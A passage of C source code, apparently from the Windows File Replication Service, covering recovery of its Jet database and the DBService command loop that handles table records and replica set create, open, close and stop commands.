            if (FStatus == FrsErrorJetSecIndexCorrupted) {
                //
                // Need to rebuild the unicode indexes.  See DbsRecreateIndexes()
                //
                DPRINT(0, ":S: Jet error -1414 caused by upgrade to new build\n");
                DPRINT(0, ":S: Stopping the service.\n");
                return FStatus;
            } else {
                DPRINT(0, ":S: Creating new database file.\n");
            }

            //
            // First delete the DB file.
            //
            WStatus = FrsForceDeleteFile(JetFile);
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1_WS(0, "ERROR - FAILED To delete %ws.", JetFile, WStatus);
                return FrsErrorAccess;
            }
            //
            // Remove other jet files by deleting all of the files in
            // the jet directories JetSys, JetTemp, and JetLog.
            //
            FrsDeleteDirectoryContents(JetSys, ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE);
            FrsDeleteDirectoryContents(JetTemp, ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE);
            FrsDeleteDirectoryContents(JetLog, ENUMERATE_DIRECTORY_FLAGS_ERROR_CONTINUE);

            //
            // Create an empty database with an initial config table.
            // Jet is left shutdown after return.
            //
            *EmptyDatabase = TRUE;
            //
            // There might staging and preinstall files from old replica sets.
            // Enumerate the registry keys for replica set and delete all old
            // staging and preinstall files before creating a new database.
            //
            FrsDeleteAllTempFiles();

            jerr = DbsCreateEmptyDatabase(ThreadCtx, ConfigTableCtx);
            if (JET_SUCCESS(jerr)) {
                //
                // Try to open again.
                //
                ConfigTableCtx->ReplicaNumber = FRS_SYSTEM_INIT_REPLICA_NUMBER;
                jerr = DbsOpenConfig(ThreadCtx, ConfigTableCtx);
                DPRINT_JS(0,"ERROR - OpenConfig failed on empty database.", jerr);
            } else {
                DPRINT_JS(0,"ERROR - Create empty database failed.", jerr);
            }
            FStatus = DbsTranslateJetError(jerr, FALSE);
        }
    }
    //
    // If no access or no disk space or still no database then exit.
    //
    if ((FStatus == FrsErrorDiskSpace)         ||
        (FStatus == FrsErrorAccess)            ||
        (FStatus == FrsErrorDatabaseCorrupted) ||
        (FStatus == FrsErrorInternalError)     ||
        (FStatus == FrsErrorResource)          ||
        (FStatus == FrsErrorDatabaseNotFound)) {

        return FStatus;
    }

    //
    // We have the '<init>' record so limit the number of config table columns
    // accessed for the per-replica entries to REPLICA_CONFIG_RECORD_MAX_COL.
    // Two column count fields are changed, one in the TABLE_CREATE struct for
    // config and the other in the FieldInfo[0].Size field for the config record.
    //
    JTableCreate = ConfigTableCtx->pJetTableCreate;
    FieldInfo = ConfigTableCtx->pRecordFields;

    JTableCreate->cColumns = REPLICA_CONFIG_RECORD_MAX_COL;
    FieldInfo[0].Size = REPLICA_CONFIG_RECORD_MAX_COL;

    DbsDumpTable(ThreadCtx, ConfigTableCtx, ReplicaSetNameIndexx);


    /**********************************************************************
    *                                                                     *
    *         O P E N   A L L   R E P L I C A   S E T S                   *
    *                                                                     *
    **********************************************************************/

    jerr = DBS_OPEN_TABLE(ThreadCtx,
                          ConfigTableCtx,
                          FRS_SYSTEM_INIT_REPLICA_NUMBER,
                          TableName,
                          &Tid);

    CLEANUP1_JS(0, "FrsOpenTable (%s) :", TableName, jerr, ERROR_RET_CONFIG);

    DPRINT1(1, "FrsOpenTable (%s) success\n", TableName);

    FrsMaxReplicaNumberUsed = DBS_FIRST_REPLICA_NUMBER - 1;
    jerr = FrsEnumerateTable(ThreadCtx,
                             ConfigTableCtx,
                             ReplicaNumberIndexx,
                             DbsSetupReplicaStateWorker,
                             NULL);
    if (!JET_SUCCESS(jerr) && (jerr != JET_errNoCurrentRecord)) {
        DPRINT_JS(0, "ERROR - FrsEnumerateTable for DbsSetupReplicaStateWorker:", jerr);
    }

    //
    // Look for any errors encountered trying to init a replica set.
    // Note that any failure in starting a specific replica set should not
    // prevent other replica sets from starting nor should it prevent new
    // replica sets from being created.
    //
    //
    // In DbsProcessReplicaFaultList() there are calls to send
    // command to the DB command server.  The CMD_DELETE_NOW sent to the replica
    // command server will end up sending a command to the DB cmd server.
    // Since we are currently executing in the DB Service
    // thread we have not yet got far enough to be executing the command service
    // loop.  So I would think that at startup if there were any pending replica
    // sets to delete on the fault list that this code would hang the DB service.
    // Disable the call to DbsProcessReplicaFaultList until the hang cases are
    // understood.
    //
//    DbsProcessReplicaFaultList(NULL);

    //
    // Recover the staging areas. WARN - the staging areas can not
    // be reliably recovered if there are replicas on the fault list.
    // Also note: If a replica set has been deleted it will still be inited
    // above since it could be reanimated but any errors related to the
    // preinstall dir or the staging dir are ignored because if the user
    // really has deleted the replica set from this member they may also
    // have deleted the above dirs.
    //
    DbsRecoverStagingAreas(ThreadCtx);

    //
    // Indicates that the initial staging recovery is complete. Used to not
    // start reclaiming staging space before this point.
    //
    StagingRecoveryComplete = TRUE;

    DbsCloseTable(jerr, ThreadCtx->JSesid, ConfigTableCtx);
    DPRINT_JS(0,"ERROR - JetCloseTable on FrsInitReplica->ConfigTable failed:", jerr);

    DPRINT(4, ":S: ****************  DBsInit complete  ****************\n");

    return FStatus;


ERROR_RET_CONFIG:

    // Close the system init config table, reset ConfigTableCtx Tid and Sesid.
    // DbsCloseTable is a Macro, writes 1st arg.
    //
    DbsCloseTable(jerr1, ThreadCtx->JSesid, ConfigTableCtx);
    DPRINT_JS(0,"ERROR - JetCloseTable on FrsInitReplica->ConfigTable failed:", jerr1);
    jerr = JET_SUCCESS(jerr) ? jerr1 : jerr;

    //
    // Now free the storage associated with all the system init config table
    // and the system init REPLICA struct as well.
    //
    FrsInitReplica = FrsFreeType(FrsInitReplica);

    return DbsTranslateJetError(jerr, FALSE);
}


DWORD
WINAPI
DBService(
    LPVOID ThreadContext
    )

/*++

Routine Description:

    This is the DBService command processor.  It processes command packets
    from the DBServiceCmdServer queue.  There can be multiple threads serving
    the command server queue.

Arguments:

    ThreadContext - ptr to the FrsThread.

Thread Return Value:

    ERROR_SUCCESS - Thread terminated normally.

--*/
{
#undef DEBSUB
#define DEBSUB  "DBService:"

    PFRS_THREAD FrsThread = (PFRS_THREAD) ThreadContext;

    JET_ERR               jerr, jerr1;
    PTHREAD_CTX           ThreadCtx;
    JET_SESID             Sesid;
    JET_TABLEID           Tid;
    JET_TABLEID           FrsOpenTableSaveTid;   // for FrsOpenTableMacro DEBUG
    PJET_TABLECREATE      JTableCreate;

    PLIST_ENTRY           Entry;

    NTSTATUS              Status;
    ULONG                 WStatus = ERROR_SUCCESS;
    FRS_ERROR_CODE        FStatus, FStatus1;

    PFRS_NODE_HEADER      Header;
    PCOMMAND_PACKET       CmdPkt;
    PVOLUME_MONITOR_ENTRY pVme;

    PCONFIG_TABLE_RECORD  ConfigRecord;

    ULONG                 ReplicaNumber;
    TABLE_CTX             TempTableCtxState;
    PTABLE_CTX            TempTableCtx = &TempTableCtxState;
    CHAR                  TableName[JET_cbNameMost];

    PDB_SERVICE_REQUEST   DbsRequest;
    PTABLE_CTX            TableCtx;
    PREPLICA              Replica;
    ULONG                 TableType;
    PVOID                 CallContext;
    ULONG                 AccessRequest;
    ULONG                 IndexType;
    PVOID                 KeyValue;
    ULONG                 KeyValueLength;
    ULONG                 FieldCount;
    PDB_FIELD_DESC        FieldDesc;
    PULONG                FieldIDList;

    ULONG                 AccessCode;
    BOOL                  AccessClose;
    BOOL                  AccessFreeTableCtx;
    BOOL                  AccessOpen, OurAlloc;
    LONG                  JetRow;
    PCHAR                 IndexName;
    PFRS_QUEUE            IdledQueue;
    ULONG                 Command;
    ULONG                 SleepCount;

    PREPLICA_THREAD_CTX   RtCtx;

    ThreadCtx = NULL;

    DPRINT(0, ":S: Initializing DBService Subsystem\n");

    //
    // Allocate a context for Jet to run in this thread.
    //
    ThreadCtx = FrsAllocType(THREAD_CONTEXT_TYPE);

    TempTableCtx->TableType = TABLE_TYPE_INVALID;

    INITIALIZE_DBS_INIT_LOCK;

    WStatus = ERROR_SUCCESS;
    try {
    //
    // Init the database.
    // Setup a Jet Session returning the session ID in ThreadCtx.
    //
    FStatus = DbsDBInitialize(ThreadCtx, &DBSEmptyDatabase);
    DEBUG_FLUSH();
    //
    // Get exception status.
    //
    } except (EXCEPTION_EXECUTE_HANDLER) {
        GET_EXCEPTION_CODE(WStatus);
    }

    if (!FRS_SUCCESS(FStatus) || !WIN_SUCCESS(WStatus)) {
        DPRINT_FS(0, ":S: FATAL ERROR - DataBase could not be started or created:", FStatus);
        if (!FrsIsShuttingDown) {
            //
            // Can't start the database means we are hosed.  An exit will force
            // the service controller to restart us.  Generate an event log
            // message if there is something the user can do.
            //
            if (FStatus == FrsErrorDiskSpace) {
                EPRINT2(EVENT_FRS_DATABASE_SPACE, ComputerName, WorkingPath);
            }

            FrsSetServiceStatus(SERVICE_STOPPED,
                                0,
                                DEFAULT_SHUTDOWN_TIMEOUT * 1000,
                                ERROR_NO_SYSTEM_RESOURCES);

            DEBUG_FLUSH();

            exit(ERROR_NO_SYSTEM_RESOURCES);
        }
    }

    //
    // The database is as initialized as it is going to get; start
    // accepting commands
    //
    SetEvent(DataBaseEvent);

    //
    // Free up memory by reducing our working set size
    //
    SetProcessWorkingSetSize(ProcessHandle, (SIZE_T)-1, (SIZE_T)-1);

    //
    // CAN'T INITIALIZE; RETURN ERROR FOR ALL COMMANDS
    //
    if (!FRS_SUCCESS(FStatus)) {

        //
        // Return error for every request until a stop command is issued.
        //
        while (TRUE) {
            CmdPkt = FrsGetCommandServer(&DBServiceCmdServer);
            if (CmdPkt == NULL)
                continue;
            Command = CmdPkt->Command;
            FrsCompleteCommand(CmdPkt, ERROR_REQUEST_ABORTED);
            if (Command == CMD_STOP_SUBSYSTEM) {
                FrsRunDownCommandServer(&DBServiceCmdServer, &DBServiceCmdServer.Queue);
                FrsSubmitCommand(FrsAllocCommand(&JournalProcessQueue, CMD_STOP_SUBSYSTEM), FALSE);
                goto ERROR_TERM_JET;
            }
        }
    }
    DPRINT(0, "DataBase has started.\n");

    //
    // INITIALIZATION OKAY; PROCESS COMMANDS
    //
    Sesid = ThreadCtx->JSesid;
    DPRINT(4,"JetOpenDatabase complete\n");


/******************************************************************************
*******************************************************************************
**                                                                           **
**                                                                           **
**         M A I N   D B   S E R V I C E   P R O C E S S   L O O P           **
**                                                                           **
**                                                                           **
*******************************************************************************
******************************************************************************/

    //
    // Try-Finally
    //
    try {

    //
    // Capture exception.
    //
    try {

    while (TRUE) {
        CmdPkt = FrsGetCommandServerIdled(&DBServiceCmdServer, &IdledQueue);
        if (CmdPkt == NULL)
            continue;
        if (CmdPkt->Header.Type != COMMAND_PACKET_TYPE) {
            DPRINT1(0, "ERROR - Invalid header type: %d\n", CmdPkt->Header.Type);
            continue;
        }

        DPRINT1(5, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);


        //
        // Capture the command packet params.
        //
        DbsRequest = &CmdPkt->Parameters.DbsRequest;

        TableCtx       = NULL;
        Replica        = DbsRequest->Replica;
        TableType      = DbsRequest->TableType;
        CallContext    = DbsRequest->CallContext;
        AccessRequest  = DbsRequest->AccessRequest;
        IndexType      = DbsRequest->IndexType;
        KeyValue       = DbsRequest->KeyValue;
        KeyValueLength = DbsRequest->KeyValueLength;
        FieldCount     = DbsRequest->FieldCount;
        FieldDesc      = DbsRequest->Fields;
        FieldIDList    = DbsRequest->SimpleFieldIDS;


        AccessCode  = AccessRequest & DBS_ACCESS_MASK;
        AccessClose = (AccessRequest & DBS_ACCESS_CLOSE) != 0;
        AccessFreeTableCtx = (AccessRequest & DBS_ACCESS_FREE_TABLECTX) != 0;

        ReplicaNumber = ReplicaAddrToId(Replica);

        DbsRequest->FStatus = FrsErrorSuccess;
        FStatus = FrsErrorSuccess;
        WStatus = ERROR_SUCCESS;

        switch (CmdPkt->Command) {


        case CMD_COMMAND_ERROR:
            DPRINT1(0, "ERROR - Invalid DBService command: %d\n", CmdPkt->Command);
            FStatus = FrsErrorBadParam;
            break;

        case CMD_INIT_SUBSYSTEM:

            break;


        case CMD_START_SUBSYSTEM:

            break;


        case CMD_STOP_SUBSYSTEM:
            DPRINT(4, "Stopping DBService Subsystem\n");

            //
            // Close the replica sets *after* the journal thread has
            // exited because the journal thread may depend on fields
            // that are becoming invalid during close.
            //
            // 209494   B3SS:  4 computers. 1 stress. 1 stop/start @ 15min. Moves between dirs. Assertion at 1st stop.
            // Don't force the journal thread to exit until after the
            // db cs receives the CMD_STOP_SUBSYSTEM because some command
            // packets depend on tables kept by the journal thread.
            //

            //
            // Tell the journal sub-system to stop.
            //
            FrsSubmitCommand(FrsAllocCommand(&JournalProcessQueue, CMD_STOP_SUBSYSTEM), FALSE);
            //
            // Find the journal thread and wait (awhile) for it to exit
            //
            MonitorThread = ThSupGetThread(Monitor);
            DPRINT1(4, "ThSupWaitThread(MonitorThread) - 3 %08x\n", MonitorThread);
            WStatus = ThSupWaitThread(MonitorThread, 30 * 1000);
            DPRINT1_WS(4, "ThSupWaitThread(MonitorThread) Terminating - 4 %08x :",
                       MonitorThread, WStatus);
            CHECK_WAIT_ERRORS(1, WStatus, 1, ACTION_CONTINUE);

            ThSupReleaseRef(MonitorThread);

            //
            // CLOSE THE REPLICA TABLES and update the config record.
            //
            //
            // Shutting down a replica requires sending a command
            // to the outlog process. The outlog process may try
            // to scan the ReplicaListHead; resulting in deadlock.
            //
            // So, don't hold the lock during shutdown.
            //
            FStatus = FrsErrorSuccess;
            ForEachListEntryLock( &ReplicaListHead, REPLICA, ReplicaList,
                //
                // The Loop iterator pE is of type PREPLICA.
                //
                FStatus1 = DbsShutdownSingleReplica(ThreadCtx, pE);
                FStatus = FRS_SUCCESS(FStatus) ? FStatus1 : FStatus;
            );
            //
            // Close the FAULT list, too
            //
            ForEachListEntry( &ReplicaFaultListHead, REPLICA, ReplicaList,
                //
                // The Loop iterator pE is of type PREPLICA.
                //
                FStatus1 = DbsCloseSessionReplicaTables(ThreadCtx, pE);
                DPRINT1_FS(0,"ERROR - DbsCloseSessionReplicaTables failed on Replica %ws :",
                        pE->ReplicaName->Name, FStatus1);

                FStatus = FRS_SUCCESS(FStatus) ? FStatus1 : FStatus;
            );

            //
            // DISCARD REMAINING QUEUE ENTRIES
            //
            FrsRunDownCommandServer(&DBServiceCmdServer, &DBServiceCmdServer.Queue);

            //
            // ShutDown the outbound log processor
            //
            //
            // NOPE; the database server requires the outbound log
            // processor when shutting down. The database server will
            // shutdown the outbound log processor when its done.
            // Like now.
            //
            DPRINT(1,"\tShutting down Outbound Log Processor...\n");
            DEBUG_FLUSH();
            ShutDownOutLog();

            //
            // COMPLETE THE COMMAND PACKET AND CLEAN UP JET
            //
            FrsCompleteCommand(CmdPkt, ERROR_SUCCESS);
            goto EXIT_THREAD;
            break;



        //
        // Close the jet table and release the table context.
        //
        case CMD_CLOSE_TABLE:

            TableCtx = DbsRequest->TableCtx;
            AccessClose = TRUE;
            break;


        //
        // Update specific record fields.
        //
        // Pass in a field list -
        //  Number of record fields to update.
        //  Ptr to vector of field codes for this table.
        //  New Data is in record assocated with TableCtx.
        //
        case CMD_UPDATE_RECORD_FIELDS:
            /* FALL THROUGH */

        //
        // Handle a table read, write or update here.
        //
        // Args:
        //  TableCtxHandle  (pass in NULL on 1st call then return it afterwords)
        //  Replica Struct
        //  TableType
        //  RecordRequest (ByKey, First, Last, Next)
        //  RecordIndexType
        //  RecordKeyValue
        //  ReturnStatus
        //
        case CMD_UPDATE_TABLE_RECORD:
        case CMD_INSERT_TABLE_RECORD:
        case CMD_READ_TABLE_RECORD:
        case CMD_DELETE_TABLE_RECORD:

            //
            // If no TableCtx handle then alloc and init one, open table
            // and return the handle.  If the caller said to close or
            // free the table context at the end of the operation then we
            // can use our stack table ctx and avoid the alloc.
            //
            // If a TableCtx is provided then use it and just check if we
            // need to reopen the table.
            //
            TableCtx = DbsRequest->TableCtx;
            OurAlloc = FALSE;

            if (TableCtx == NULL) {
                if (AccessFreeTableCtx || AccessClose) {
                    TableCtx = TempTableCtx;
                } else {
                    TableCtx = FrsAlloc(sizeof(TABLE_CTX));
                    TableCtx->TableType = TABLE_TYPE_INVALID;
                }
                AccessOpen = TRUE;
                OurAlloc = TRUE;
            } else {
                TableType = TableCtx->TableType;
                AccessOpen = !IS_TABLE_OPEN(TableCtx);
            }
            //
            // Re-open the table if needed.
            // Fail if this is a replica table & no Replica struct given.
            //
            if (AccessOpen) {
                if ((Replica == NULL) && IS_REPLICA_TABLE(TableType)) {
                    DPRINT(0, "ERROR - Replica ptr is NULL\n");
                    FStatus = FrsErrorBadParam;
                    break;
                }

                if (OurAlloc) {
                    //
                    // Init the table context struct and alloc the data record.
                    //
                    jerr = DbsOpenTable(ThreadCtx,
                                        TableCtx,
                                        ReplicaNumber,
                                        TableType,
                                        NULL);
                } else {
                    //
                    // Table context all set.  Just open table.
                    //
                    jerr = DBS_OPEN_TABLE(ThreadCtx, TableCtx, ReplicaNumber, TableName, &Tid);
                }

                if (!JET_SUCCESS(jerr)) {
                    DPRINT_JS(0, "FrsOpenTable error:", jerr);
                    FStatus = DbsTranslateJetError(jerr, FALSE);
                    //
                    // Failed to open.  Clean up here.
                    //
                    if (OurAlloc && (TableCtx != TempTableCtx)) {
                        TableCtx = FrsFree(TableCtx);
                    }
                    break;
                }
                if (!OurAlloc) {
                    DbsRequest->TableCtx = TableCtx;
                }
            }


            JTableCreate = TableCtx->pJetTableCreate;

            //
            // Position to the desired record based on the Access code.
            // Not needed for an insert.
            //
            if (CmdPkt->Command != CMD_INSERT_TABLE_RECORD) {
                switch (AccessCode) {

                case DBS_ACCESS_BYKEY:
                    //
                    // Seek to the record using the key value.
                    //
                    jerr = DbsSeekRecord(ThreadCtx, KeyValue, IndexType, TableCtx);
                    break;

                    //
                    // Go to the first or last record in the table.
                    //
                case DBS_ACCESS_FIRST:
                case DBS_ACCESS_LAST:
                case DBS_ACCESS_NEXT:

                    JetRow = (AccessCode == DBS_ACCESS_FIRST) ? JET_MoveFirst :
                             (AccessCode == DBS_ACCESS_LAST)  ? JET_MoveLast  :
                                                                JET_MoveNext;
                    //
                    // Move to the first or last record of the specified index.
                    //
                    jerr = JET_errSuccess;
                    FStatus = DbsTableMoveToRecord(ThreadCtx, TableCtx, IndexType, JetRow);
                    if (FStatus == FrsErrorNotFound) {
                        if (CmdPkt->Command != CMD_INSERT_TABLE_RECORD) {
                            FStatus = FrsErrorEndOfTable;
                        } else {
                            FStatus = FrsErrorSuccess;
                        }
                    } else
                    if (!FRS_SUCCESS(FStatus)) {
                        jerr = JET_errNoCurrentRecord;
                    }
                    break;


                default:

                    jerr = JET_errInvalidParameter;

                }  // end of switch on AccessCode


                //
                // If record positioning failed then we are done.
                //
                if (!JET_SUCCESS(jerr)) {
                    DPRINT_JS(0, "ERROR - Record Access failed:", jerr);
                    FStatus = DbsTranslateJetError(jerr, FALSE);
                    DPRINT2(0, "ERROR - ReplicaName: %ws  Table: %s\n",
                            (Replica != NULL) ? Replica->ReplicaName->Name : L"<null>",
                            JTableCreate->szTableName);
                    break;
                }

                if (!FRS_SUCCESS(FStatus)) {
                    break;
                }
            }

            //
            // Initialize the JetSet/RetCol arrays and data record buffer
            // addresses to read and write the fields of the data record.
            //
            DbsSetJetColSize(TableCtx);
            DbsSetJetColAddr(TableCtx);

            //
            // Allocate the storage for any unallocated fields in
            // the variable length record fields.
            // Update the JetSet/RetCol arrays appropriately.
            //
            Status = DbsAllocRecordStorage(TableCtx);

            if (!NT_SUCCESS(Status)) {
                DPRINT_NT(0, "ERROR - DbsAllocRecordStorage failed to alloc buffers.", Status);
                WStatus = FrsSetLastNTError(Status);
                FStatus = FrsErrorResource;
                break;
            }

            if (CmdPkt->Command == CMD_READ_TABLE_RECORD) {
                //
                //  Now read the record.
                //
                FStatus = DbsTableRead(ThreadCtx, TableCtx);
                if (!FRS_SUCCESS(FStatus)) {
                    DPRINT_FS(0, "Error - can't read selected record.", FStatus);
                    jerr = JET_errRecordNotFound;
                    DBS_DISPLAY_RECORD_SEV(1, TableCtx, TRUE);
                }
            } else

            if (CmdPkt->Command == CMD_INSERT_TABLE_RECORD) {
                //
                // Insert a new record.
                //
                jerr = DbsInsertTable2(TableCtx);
            } else

            if (CmdPkt->Command == CMD_UPDATE_TABLE_RECORD) {
                //
                // Update an existing record.
                //
                jerr = DbsUpdateTable(TableCtx);
            } else

            if (CmdPkt->Command == CMD_DELETE_TABLE_RECORD) {
                //
                // Delete an existing record.
                //
                jerr = DbsDeleteTableRecord(TableCtx);
            } else

            if (CmdPkt->Command == CMD_UPDATE_RECORD_FIELDS) {
                //
                // Update the requested fields in the record.
                //
                DBS_DISPLAY_RECORD_SEV_COLS(4, TableCtx, FALSE, FieldIDList, FieldCount);

                FStatus = DbsWriteTableFieldMult(ThreadCtx,
                                                 Replica->ReplicaNumber,
                                                 TableCtx,
                                                 FieldIDList,
                                                 FieldCount);
                DPRINT2_FS(0, "ERROR updating record fields on %ws  Table: %s :",
                           Replica->ReplicaName->Name, JTableCreate->szTableName, FStatus);
                jerr = JET_errSuccess;  // To skip error msg below.
            }


            if (!JET_SUCCESS(jerr)) {
                DPRINT_JS(0, "Error on reading, writing or updating table record:", jerr);
                DPRINT2(0, "ReplicaName: %ws  Table: %s\n",
                        Replica->ReplicaName->Name, JTableCreate->szTableName);
                FStatus = DbsTranslateJetError(jerr, FALSE);
            }

            break;
        //
        // Create a new replcia set member.  Write the config record
        // and create the tables.
        //
        case CMD_CREATE_REPLICA_SET_MEMBER:

            if (FrsIsShuttingDown) {
                FStatus = FrsErrorShuttingDown;
            } else {
                FStatus = DbsCreateReplicaTables(ThreadCtx, Replica, DbsRequest->TableCtx);
            }
            DPRINT_FS(0, "ERROR: CMD_CREATE_REPLICA_SET_MEMBER failed.", FStatus);
            break;

        //
        // Update a replcia set member. Update the config record
        //
        case CMD_UPDATE_REPLICA_SET_MEMBER:
            FStatus = DbsUpdateReplica(ThreadCtx, Replica);
            break;

        //
        // Delete a replcia set member.  Delete the config record
        // and the tables.
        //
        case CMD_DELETE_REPLICA_SET_MEMBER:

            if (FrsIsShuttingDown) {
                FStatus = FrsErrorShuttingDown;
            } else {
                jerr = DbsReclaimStagingSpace(ThreadCtx, Replica);
                jerr = DbsDeleteReplicaTables(ThreadCtx, Replica);
            }
            break;

        //
        // Open a new replica set member using the replica ID passed in
        // the replica struct.  Initialize the Replica struct and open
        // the tables.
        //
        case CMD_OPEN_REPLICA_SET_MEMBER:

            if (FrsIsShuttingDown) {
                FStatus = FrsErrorShuttingDown;
            } else {
                FStatus = DbsOpenReplicaSet(ThreadCtx, Replica);
            }
            DPRINT_FS(0, "ERROR: CMD_OPEN_REPLICA_SET_MEMBER failed.", FStatus);
            break;
        //
        // Close the open replica tables and release the RtCtx struct.
        //
        case CMD_CLOSE_REPLICA_SET_MEMBER:
            FStatus = DbsCloseSessionReplicaTables(ThreadCtx, Replica);
            DPRINT1_FS(0,"ERROR - DbsCloseSessionReplicaTables failed on Replica %ws :",
                       Replica->ReplicaName->Name, FStatus);
            if (FRS_SUCCESS(FStatus)) {
                DPRINT1(4,"DbsCloseSessionReplicaTables RtCtx complete on %ws\n",
                        Replica->ReplicaName->Name);
            }
            break;


        //
        // Walk through a directory tree and load the IDTable and DIRTable
        //
        case CMD_LOAD_REPLICA_FILE_TREE:

            RtCtx = (PREPLICA_THREAD_CTX) CallContext;
            ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);

            DPRINT5(4, "LoadReplicaTree: %08x, ConfigRecord: %08x,  RtCtx: %08x, %ws, path: %ws\n",
                    Replica, ConfigRecord, RtCtx, Replica->ReplicaName->Name, ConfigRecord->FSRootPath);

            WStatus = DbsLoadReplicaFileTree(ThreadCtx,
                                             Replica,
                                             RtCtx,
                                             ConfigRecord->FSRootPath);
            //
            // If the IDTable already exists and is not empty then we bail.
            //
            FStatus = FrsTranslateWin32Error(WStatus);
            if (WStatus != ERROR_FILE_EXISTS) {
                if (!WIN_SUCCESS(WStatus)) {
                    DisplayErrorMsg(0, WStatus);

                } else {
                    //
                    // Now scan the IDTable and build the DIRTable.
                    //
                    jerr = DbsBuildDirTable(ThreadCtx, &RtCtx->IDTable, &RtCtx->DIRTable);

                    if (!JET_SUCCESS(jerr)) {
                        DPRINT_JS(0, "ERROR - DbsBuildDirTable:", jerr);
                        FStatus = DbsTranslateJetError(jerr, FALSE);
                        break;
                    }
                    DPRINT1(4, "****************  Done  DbsBuildDirTable for %ws ***************\n", Replica->ReplicaName->Name);
                }
            }

            break;


        //
        // Walk through a directory tree and load the IDTable and DIRTable
        //
        case CMD_LOAD_ONE_REPLICA_FILE_TREE:

            RtCtx = (PREPLICA_THREAD_CTX) CallContext;
            ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);

            DPRINT5(4, "LoadOneReplicaTree: %08x, ConfigRecord: %08x,  RtCtx: %08x, %ws, path: %ws\n",
                    Replica, ConfigRecord, RtCtx, Replica->ReplicaName->Name, ConfigRecord->FSRootPath);

            WStatus = DbsLoadReplicaFileTree(ThreadCtx,
                                             Replica,
                                             RtCtx,
                                             ConfigRecord->FSRootPath);
            //
            // If the IDTable already exists and is not empty then we
            // do not recreate it.
            //
            FStatus = FrsTranslateWin32Error(WStatus);
            if (WStatus != ERROR_FILE_EXISTS) {
                if (!WIN_SUCCESS(WStatus)) {
                    DisplayErrorMsg(0, WStatus);
                    break;

                } else {
                    //
                    // Now scan the IDTable and build the DIRTable.
                    //
                    jerr = DbsBuildDirTable(ThreadCtx, &RtCtx->IDTable, &RtCtx->DIRTable);

                    if (!JET_SUCCESS(jerr)) {
                        DPRINT_JS(0, "ERROR - DbsBuildDirTable:", jerr);
                        FStatus = DbsTranslateJetError(jerr, FALSE);
                        break;
                    }
                    DPRINT1(4, "****************  Done  DbsBuildDirTable for %ws ***************\n", Replica->ReplicaName->Name);
                }
            } else {
                FStatus = FrsErrorSuccess;
            }


            //
            // Continue with phase 2 of replica set init here.  This is becuase
            // we need the journal thread free to process the journal buffers
            // from the journal we are about to pause.  Once those journal
            // buffers are complete the journal thread will see the command
            // packet (CMD_JOURNAL_PAUSED) from the journal read thread that
            // sets the event to unwait us.
            //

            //
            // Phase 2.  Init (or add to the volume filter table and the parent
            // File ID table.  But first we Pause the journal so we don't filter
            // against an inconsistent table.  This call will block our thread until
            // the Pause completes or times out.  If we can't pause the volume then
            // we fail.
            //
            WStatus = JrnlPauseVolume(Replica->pVme, 60*1000);
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT_WS(0, "ERROR - Status from Pause", WStatus);
                //
                // The replica state is in the error state.
                //
                FStatus =  FrsErrorReplicaPhase2Failed;
                break;
            }

            DPRINT3(4, "Phase 2 for replica %ws, id: %d, (%08x)\n",
                    Replica->ReplicaName->Name, Replica->ReplicaNumber, Replica);

            WStatus = JrnlPrepareService2(ThreadCtx, Replica);

            if (!WIN_SUCCESS(WStatus)) {
                DPRINT1_WS(4, "Phase 2 for replica %ws Failed; ",
                           Replica->ReplicaName->Name, WStatus);
                //
                // The replica state is in the error state.
                //
                FStatus =  FrsErrorReplicaPhase2Failed;
                break;
            }

            //
            // We are now initialized and the vme is on the Volume Monitor List.
            // The journal state is paused.
            //

            FStatus =  FrsErrorSuccess;

            break;



        case CMD_STOP_REPLICATION_SINGLE_REPLICA:

            FStatus = FrsErrorSuccess;

            ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);
            pVme = Replica->pVme;

            //
            // Journaling never began on this replica
            //
            if (pVme == NULL) {
                DPRINT4(4, "Null pVme when StoppingSingleReplica: %08x, ConfigRecord: %08x,  %ws, path: %ws\n",
                        Replica, ConfigRecord, Replica->ReplicaName->Name, ConfigRecord->FSRootPath);
                FStatus = FrsErrorSuccess;
                break;
            }

            DPRINT4(4, "StoppingSingleReplica: %08x, ConfigRecord: %08x,  %ws, path: %ws\n",
                    Replica, ConfigRecord, Replica->ReplicaName->Name, ConfigRecord->FSRootPath);

            //
            // Pause the journal here. This is becuase
            // we need the journal thread free to process the journal buffers
            // from the journal we are about to pause.  Once those journal
            // buffers are complete the journal thread will see the command
            // packet (CMD_JOURNAL_PAUSED) from the journal read thread that
            // sets the event to unwait us.
            //
            // This call will block our thread until the Pause completes or
            // times out.  If we can't pause the volume then we fail.
            //
            WStatus = JrnlPauseVolume(pVme, 400*1000);
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT_WS(0, "ERROR - Status from Pause", WStatus);
                //
                // The replica state is in the error state.
                //
                FStatus =  FrsErrorJournalPauseFailed;
                break;
            }
            //
            // Clean out the filter and parent file ID tables.
            //
            JrnlCleanOutReplicaSet(Replica);

            //
            // Disable Journalling on this replica set. If this is the last one
            // on the volume then close the handle on the volume and free
            // VME related tables.
            //
            WStatus = JrnlShutdownSingleReplica(Replica, FALSE);
            if (!WIN_SUCCESS(WStatus)) {
                DPRINT_WS(0, "Error from JrnlShutdownSingleReplica", WStatus);
                FStatus = FrsErrorJournalReplicaStop;
            }
#if 0
            //
            // If we still have outstanding change orders in process for this
            // replica we need to wait here until they either go thru retry or
            // retire.
            //
            // Problem is that we can't wait here since the COs need
            // to use the DBService thread.  That's us.
            // see bug number 71165
            //

            // the below caused an AV.
            if (GhtCountEntries(pVme->ActiveInboundChangeOrderTable) != 0) {
                //
                // Build a cmd packet for the DB server to comlete the shutdown.
                // Or return an error status to the caller indicating the caller
                // must check for outstanding cos after which caller can
                // submit the cmd packet.

                // See above. how do we know that CO Accept isn't just about to start another CO?

                //
                // OR could we use the ref count on the replica struct to know
                // that it is OK to do the shutdown below?
                //
            }
#endif


            //
            // Close open tables for this replica set and update config record.
            // Set Replica service state to STOPPED.
            //
            FStatus1 = DbsShutdownSingleReplica(ThreadCtx, Replica);
            if (FRS_SUCCESS(FStatus)) {
